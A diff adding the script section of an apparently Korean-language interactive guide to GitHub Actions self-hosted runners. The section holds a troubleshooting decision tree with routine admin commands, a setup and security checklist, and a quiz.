+ r_network:{t:'네트워크 · 프록시 문제',c:'프로세스는 살아있지만 GitHub과 통신하지 못하는 상태입니다. 방화벽 정책 변경, 프록시 인증 만료, DNS, 시간 동기화를 확인하세요.',
+   cmd:'curl -sS -o /dev/null -w "%{http_code}\\n" https://api.github.com\ncurl -sS -o /dev/null -w "%{http_code}\\n" https://objects.githubusercontent.com\ntimedatectl\ntail -n 60 /opt/actions-runner/_diag/Runner_*.log'},
+ r_svcstart:{t:'서비스가 중단됨',c:'서비스를 시작하고 부팅 시 자동 시작을 활성화하세요. 시작 직후 다시 죽으면 저널 로그의 마지막 에러를 확인합니다.',
+   cmd:'cd /opt/actions-runner\nsudo ./svc.sh start\nsudo ./svc.sh status\nsudo journalctl -u \'actions.runner.*\' -n 80 --no-pager'},
+ r_reregister:{t:'등록 정보 손상 → 재등록 필요',c:'GitHub에서 러너가 삭제되었거나 .credentials가 깨진 경우 systemd가 무한 재시작합니다. 재시작이 아니라 재등록이 정답입니다.',
+   cmd:'cd /opt/actions-runner\nsudo ./svc.sh stop && sudo ./svc.sh uninstall\n./config.sh remove --token <REMOVE_TOKEN>   # 실패하면 UI에서 러너 삭제\n./config.sh --url <URL> --token <NEW_TOKEN> --name <NAME> --labels ... --unattended --replace\nsudo ./svc.sh install actions && sudo ./svc.sh start'},
+ r_svcinstall:{t:'서비스 미등록 (SSH 종료와 함께 죽음)',c:'run.sh를 터미널에서 실행하면 세션이 끊기면 러너도 종료됩니다. systemd 서비스로 등록하세요(7장).',
+   cmd:'cd /opt/actions-runner\nsudo ./svc.sh install actions\nsudo ./svc.sh start\nsystemctl is-enabled \'actions.runner.*\''},
+ r_404:{t:'URL · 권한 문제 (TS-03)',c:'등록 URL 형식과 권한을 확인하세요. Repository는 /OWNER/REPO, Org는 /ORG 형식입니다. 권한이 없어도 404로 응답하니 admin/owner 여부를 함께 확인합니다.',
+   cmd:'# 올바른 형식\n./config.sh --url https://github.com/OWNER/REPO   --token ...  # 리포\n./config.sh --url https://github.com/ORG           --token ...  # 조직\n\n# 토큰 발급 화면과 URL 범위가 같은지 확인 (조직 토큰 ↔ 리포 URL 혼용 불가)'},
+ r_401:{t:'등록 토큰 만료 (TS-04)',c:'등록 토큰의 유효 시간은 약 1시간입니다. GitHub 화면을 새로고침해 새 토큰으로 다시 실행하세요. 서버 시간이 틀어져도 401이 납니다.',
+   cmd:'sudo timedatectl set-ntp true\ntimedatectl\n# 새 토큰으로 재시도\n./config.sh --url <URL> --token <NEW_TOKEN> --unattended'},
+ r_icu:{t:'.NET 의존 라이브러리 누락 (TS-05)',c:'러너는 .NET 기반이라 ICU 등 시스템 라이브러리가 필요합니다. 패키지에 포함된 스크립트로 한 번에 설치하세요.',
+   cmd:'sudo /opt/actions-runner/bin/installdependencies.sh\n\n# RHEL/Rocky 수동 설치\nsudo dnf install -y libicu krb5-libs zlib openssl-libs lttng-ust\n\n# ICU 설치가 불가한 폐쇄망 최후 수단\necho \'DOTNET_SYSTEM_GLOBALIZATION_INVARIANT=1\' >> /opt/actions-runner/.env'},
+ r_ssl:{t:'사내 CA · 프록시 (TS-08)',c:'SSL 인터셉트 프록시 환경입니다. 사내 루트 CA를 OS 신뢰 저장소에 등록하고 .env에 프록시 설정을 넣으세요. 검증 비활성화는 금지입니다.',
+   cmd:'sudo cp corp-root-ca.crt /usr/local/share/ca-certificates/\nsudo update-ca-certificates\n\ncat >> /opt/actions-runner/.env <<\'EOF\'\nhttps_proxy=http://user:pass@proxy.corp.local:3128\nno_proxy=localhost,127.0.0.1,.corp.local\nNODE_EXTRA_CA_CERTS=/etc/ssl/certs/ca-certificates.crt\nGIT_SSL_CAINFO=/etc/ssl/certs/ca-certificates.crt\nEOF\nsudo systemctl restart \'actions.runner.*\''},
+ r_docker:{t:'docker 그룹 권한 (TS-06)',c:'러너 실행 계정이 docker 그룹에 없습니다. 그룹 추가 후 반드시 러너 서비스를 재시작해야 적용됩니다.',
+   cmd:'sudo usermod -aG docker actions\nid actions\nsudo systemctl restart \'actions.runner.*\'\nsudo -u actions docker info | head -3'},
+ r_disk:{t:'디스크 · inode 고갈 (TS-07)',c:'_work 잔여물과 Docker 캐시가 원인입니다. 즉시 회수 후 cron 정리 작업을 등록하세요(11장).',
+   cmd:'df -h /opt; df -i /opt\ndocker system df\ndocker builder prune -af\ndocker image prune -af --filter "until=48h"\nrm -rf /opt/actions-runner/_work/_temp/*\nfind /opt/actions-runner/_diag -name \'*.log\' -mtime +7 -delete'},
+ r_oom:{t:'메모리 부족 또는 프로세스 강제 종료 (TS-12)',c:'잡 실행 중 러너 프로세스가 죽었습니다. OOM Killer 여부를 먼저 확인하고 병렬도·힙 크기를 조정하세요.',
+   cmd:'sudo dmesg -T | grep -iE \'out of memory|killed process\' | tail\nsudo journalctl -u \'actions.runner.*\' --since \'1 hour ago\' | grep -iE \'stopped|killed\'\n\n# 워크플로우에서 완화\n#   env: NODE_OPTIONS: --max-old-space-size=4096\n#   jest --maxWorkers=2 / make -j2'},
+ r_dirty:{t:'잡 간 오염 (TS-10)',c:'러너 재사용으로 이전 잡의 잔여물이 남았습니다. checkout clean, 정리 스텝, 궁극적으로 ephemeral 러너로 해결합니다.',
+   cmd:'# 워크스페이스 강제 초기화 (해당 러너에서)\nrm -rf /opt/actions-runner/_work/<repo>\n\n# 워크플로우\n# - uses: actions/checkout@v4\n#   with: { clean: true, fetch-depth: 1 }\n# - if: always()\n#   run: docker builder prune -f --filter "until=24h"'},
+ r_perf:{t:'실행 성능 튜닝',c:'러너 사양·디스크 I/O·병렬도를 점검하세요. self-hosted의 장점인 로컬 캐시를 살리되 디스크가 병목이 되지 않게 관리합니다.',
+   cmd:'# 리소스 사용 관찰 (잡 실행 중)\ntop -b -n1 | head -20\niostat -x 2 3        # sysstat 패키지\n\n# 개선 포인트\n# · _work를 NVMe/SSD 별도 볼륨으로 분리\n# · fetch-depth: 1 로 클론 축소\n# · Docker BuildKit 캐시 활용 (--cache-from)\n# · 러너 대수를 늘려 잡을 병렬화'}
+};
+let dxPath=[];
+function dxGo(id){
+  if(id==='start') dxPath=[]; 
+  dxPath.push(id);
+  const node=DX[id];
+  const crumb=document.getElementById('dxCrumb');
+  crumb.textContent = dxPath.length>1 ? ('경로: '+dxPath.map(x=>(DX[x].t||'증상 선택')).join(' → ')) : '';
+  const body=document.getElementById('dxBody');
+  if(node.o){
+    body.innerHTML='<div style="font-weight:700;font-size:15.5px;margin-bottom:14px">'+node.q+'</div>'
+      +'<div style="display:flex;flex-direction:column;gap:8px">'
+      +node.o.map(o=>'<button class="opt" onclick="dxGo(\''+o[1]+'\')">'+o[0]+'</button>').join('')
+      +'</div>';
+  }else{
+    body.innerHTML='<div style="font-family:var(--mono);font-size:10.5px;letter-spacing:.12em;'
+      +'text-transform:uppercase;color:var(--queue);margin-bottom:8px">진단 결과</div>'
+      +'<div style="font-weight:800;font-size:18px;margin-bottom:10px">'+node.t+'</div>'
+      +'<p style="color:var(--text-2);font-size:15px">'+node.c+'</p>'
+      +'<div class="code" style="margin-bottom:0"><div class="code-bar"><div class="tabs">'
+      +'<button class="tab active" onclick="tab(this,0)">권장 조치 명령</button></div>'
+      +'<button class="copy" onclick="cp(this)">복사</button></div>'
+      +'<div class="pane active"><pre>'+node.cmd.replace(/&/g,'&amp;').replace(/</g,'&lt;')+'</pre></div></div>';
+  }
+}
+
+/* ========== 5. 체크리스트 ========== */
+const CK=[
+ ['도입 목적을 문서화했다','사내망 접근 / GPU / 캐시 / 비용 — 무엇을 해결하려는지 한 줄로'],
+ ['Public 리포지토리가 아님을 확인했다','Public + self-hosted = 서버 노출. 예외 없음'],
+ ['전용 서버와 전용 실행 계정을 준비했다','useradd actions · root 실행 금지'],
+ ['디스크 30GB 이상 여유와 별도 볼륨을 확보했다','_work 전용 볼륨 권장'],
+ ['아웃바운드 443 도메인 허용을 받았다','github.com · api.github.com · objects.githubusercontent.com 등'],
+ ['프록시/사내 CA 설정을 .env에 반영했다','폐쇄망이면 필수. SSL 검증 비활성화는 금지'],
+ ['등록 범위를 정했다 (Repo / Org / Enterprise)','팀 업무면 Org + Runner Group'],
+ ['라벨 규칙을 정했다','능력·용도·환경 기준. 호스트명 라벨 금지'],
+ ['installdependencies.sh로 의존성을 설치했다','RHEL 계열은 libicu 확인'],
+ ['systemd(또는 launchd/Windows) 서비스로 등록했다','재부팅 후 자동 시작 확인'],
+ ['점검 워크플로우로 실행을 검증했다','hostname · whoami · 사내망 curl 확인'],
+ ['Fork PR 워크플로우 승인 정책을 켰다','Settings → Actions → Fork PR workflows'],
+ ['GITHUB_TOKEN 최소 권한을 적용했다','permissions: contents: read 기본'],
+ ['디스크 정리 cron을 등록했다','_work · _diag · docker prune'],
+ ['모니터링과 알람을 붙였다','러너 offline · 큐 대기시간 · 디스크 사용률'],
+ ['재설치 절차서와 담당자를 문서로 남겼다','신입도 새벽에 혼자 복구할 수 있게']
+];
+function ckInit(){
+  const box=document.getElementById('ckList');
+  box.innerHTML=CK.map((c,i)=>'<div class="ck" data-i="'+i+'" role="button" tabindex="0">'
+    +'<div class="ck-box">✓</div><div class="ck-t">'+c[0]+'<small>'+c[1]+'</small></div></div>').join('');
+  box.querySelectorAll('.ck').forEach(el=>{
+    const t=()=>{el.classList.toggle('on');ckSync();};
+    el.addEventListener('click',t);
+    el.addEventListener('keydown',e=>{if(e.key==='Enter'||e.key===' '){e.preventDefault();t();}});
+  });
+}
+function ckSync(){
+  const all=document.querySelectorAll('#ckList .ck'), on=document.querySelectorAll('#ckList .ck.on').length;
+  document.getElementById('ckCount').textContent=on+' / '+all.length;
+  document.getElementById('ckBar').style.width=(on/all.length*100)+'%';
+  document.getElementById('ckDone').style.display = (on===all.length)?'block':'none';
+}
+
+/* ========== 6. 퀴즈 ========== */
+const QZ=[
+ {q:'self-hosted runner가 GitHub과 통신하기 위해 방화벽에 필요한 설정은?',
+  a:['인바운드 TCP 443 오픈','아웃바운드 TCP 443 허용','인바운드 22(SSH) 오픈','VPN 터널 필수'],c:1,
+  e:'러너가 GitHub으로 먼저 접속해(long polling) 잡을 받아옵니다. 인바운드 포트를 열 필요가 없어 NAT·사설 IP 환경에서도 동작합니다.'},
+ {q:'runs-on: [self-hosted, Linux, gpu] 인 잡을 받을 수 있는 러너는?',
+  a:['self-hosted, Linux 라벨만 가진 러너','self-hosted, Linux, X64, gpu, docker 라벨 러너','gpu 라벨만 가진 러너','self-hosted, Windows, gpu 러너'],c:1,
+  e:'라벨 매칭은 AND 조건입니다. 요구 라벨을 모두 포함하면(추가 라벨이 더 있어도) 실행 가능합니다.'},
+ {q:'잡이 "Queued"에서 멈춰 있을 때 가장 먼저 확인할 것은?',
+  a:['GitHub 서비스 장애 페이지','러너 상태와 라벨 일치 여부','GITHUB_TOKEN 권한','Docker 버전'],c:1,
+  e:'대부분 라벨 오타 또는 러너 offline입니다. Settings → Runners에서 상태를 보고, API로 실제 라벨을 확인해 대조하세요.'},
+ {q:'Public(오픈소스) 리포지토리에 self-hosted runner를 붙이면 안 되는 이유는?',
+  a:['GitHub 약관상 과금이 발생한다','Fork PR의 임의 코드가 내 서버에서 실행된다','라벨이 자동으로 지워진다','캐시가 공유되지 않는다'],c:1,
+  e:'누구나 PR을 열 수 있고 그 워크플로우가 내 러너에서 실행됩니다. 사내망 접근 권한까지 노출되므로 GitHub도 공식적으로 금지 권고합니다.'},
+ {q:'--ephemeral 옵션의 효과는?',
+  a:['러너를 GitHub-hosted처럼 클라우드에서 실행','잡 1개 처리 후 러너 등록이 자동 해제됨','라벨을 임시로 무시','로그를 저장하지 않음'],c:1,
+  e:'잡마다 러너를 새로 만들어 잡 간 오염과 잔여 자격증명 문제를 근본적으로 없애는 방식입니다. ARC가 이 원리로 동작합니다.'},
+ {q:'등록 토큰(registration token)에 대한 설명으로 옳은 것은?',
+  a:['영구 사용 가능하니 스크립트에 하드코딩해도 된다','약 1시간 후 만료되는 일회성 토큰이다','PAT와 완전히 동일하다','러너 로그에 평문 저장된다'],c:1,
+  e:'만료가 짧은 등록 전용 토큰입니다. 자동화 시에는 하드코딩 대신 PAT나 GitHub App으로 registration-token API를 호출해 매번 새로 받으세요.'},
+ {q:'RHEL 계열에서 "Unable to load shared library libicuuc" 에러의 해결책은?',
+  a:['러너를 root로 실행','bin/installdependencies.sh 실행 또는 libicu 설치','라벨을 다시 등록','Docker 재설치'],c:1,
+  e:'러너는 .NET 기반이라 ICU 등 시스템 라이브러리가 필요합니다. 패키지에 포함된 installdependencies.sh가 가장 확실합니다.'},
+ {q:'self-hosted runner에서 디스크가 계속 차오르는 주된 원인은?',
+  a:['러너 바이너리가 커진다','_work 체크아웃 사본과 Docker 이미지·빌드 캐시가 누적된다','로그가 GitHub에 업로드되지 않는다','systemd 저널 설정 오류'],c:1,
+  e:'러너는 환경을 자동 초기화하지 않습니다. cron 정리 + 잡 내 정리 스텝 + fetch-depth 축소를 함께 적용하세요.'},
+ {q:'러너 1대에 잡이 몰려 큐가 쌓일 때 올바른 대응은?',
+  a:['러너를 재시작한다','같은 라벨의 러너를 추가하거나 ARC로 오토스케일한다','runs-on을 self-hosted 하나로 줄인다','timeout-minutes를 늘린다'],c:1,
+  e:'러너 1대는 동시에 잡 1개만 처리합니다. 고장이 아니라 용량 문제이므로 대수를 늘리는 것이 정답입니다.'},
+ {q:'ARC(Actions Runner Controller)를 쓰는 가장 큰 이유는?',
+  a:['GitHub 사용료가 무료가 된다','잡마다 새 Pod로 격리하며 필요한 만큼 자동 확장·축소한다','라벨을 쓰지 않아도 된다','Windows 러너가 필요 없어진다'],c:1,
+  e:'컨트롤러가 잡 큐를 감시해 러너 Pod를 생성/삭제합니다. 일회성 격리와 오토스케일링을 동시에 얻습니다.'}
+];
+let qzDone=0, qzRight=0;
+function qzInit(){
+  document.getElementById('quizBox').innerHTML=QZ.map((q,i)=>
+    '<div class="quiz" id="qz'+i+'"><div class="q-n">Q'+(i+1)+' / '+QZ.length+'</div>'
+    +'<div class="q-t">'+q.q+'</div>'
+    +q.a.map((a,j)=>'<button class="opt" onclick="qzAns('+i+','+j+')">'+a+'</button>').join('')
+    +'<div class="q-exp" id="qe'+i+'"><b>해설 · </b>'+q.e+'</div></div>').join('');
+}
+function qzAns(i,j){
+  const box=document.getElementById('qz'+i);
+  if(box.dataset.done) return;
+  box.dataset.done='1';
+  const opts=box.querySelectorAll('.opt');
+  opts.forEach((o,k)=>{o.disabled=true;
+    if(k===QZ[i].c) o.classList.add('right');
+    else if(k===j) o.classList.add('wrong');});
+  document.getElementById('qe'+i).classList.add('show');
+  qzDone++; if(j===QZ[i].c) qzRight++;
+  const s=document.getElementById('quizScore');
+  let msg;
+  if(qzDone<QZ.length) msg='진행 중 — 정답 <b>'+qzRight+'</b> / '+qzDone+' 문항';
+  else if(qzRight>=9) msg='완료 — <b>'+qzRight+'</b> / 10 · 바로 구축에 들어가도 좋습니다';
+  else if(qzRight>=7) msg='완료 — <b>'+qzRight+'</b> / 10 · 틀린 부분의 해당 장만 다시 보세요';
+  else msg='완료 — <b>'+qzRight+'</b> / 10 · 3·9·12장을 다시 읽어보길 권합니다';
+  s.innerHTML=msg;
+}
+
+/* ========== 7. 스크롤 스파이 · 진행바 ========== */
+(function(){
+  const secs=[...document.querySelectorAll('main section')];
+  const links=[...document.querySelectorAll('.nav a')];
+  const top=document.getElementById('toplink');
+  function onScroll(){
+    const y=window.scrollY, h=document.documentElement.scrollHeight-window.innerHeight;
+    document.getElementById('progress').style.width=(h>0?(y/h*100):0)+'%';
+    top.classList.toggle('on', y>600);
+    let cur=secs[0];
+    secs.forEach(s=>{ if(s.getBoundingClientRect().top<=140) cur=s; });
+    links.forEach(a=>a.classList.toggle('active', a.getAttribute('href')==='#'+cur.id));
+  }
+  window.addEventListener('scroll',onScroll,{passive:true});
+  window.addEventListener('resize',onScroll);
+  links.forEach(a=>a.addEventListener('click',()=>{
+    if(window.innerWidth<=980) document.getElementById('nav').classList.remove('open');
+  }));
+  document.addEventListener('DOMContentLoaded',()=>{
+    gen(); ckInit(); ckSync(); qzInit(); dxGo('start');
+    simReset(); setInterval(simStep,1300);
+    onScroll();
+  });
+})();
+</script>
+</body>
+</html>
